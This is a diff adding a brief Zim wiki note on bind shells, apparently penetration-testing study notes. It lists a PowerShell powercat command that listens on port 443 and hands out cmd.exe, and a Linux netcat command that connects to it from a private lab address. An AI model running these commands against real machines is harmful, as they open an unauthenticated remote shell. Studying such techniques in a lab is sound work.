@@ -1,0 +1,14 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:41:06-04:00
+
+====== bind shell ======
+Created Tuesday 19 May 2020
+
+====== on powershell ======
+
+**powercat -l -p 443 -e cmd.exe**
+
+====== on linux ======
+
+**nc 10.11.0.22 443**
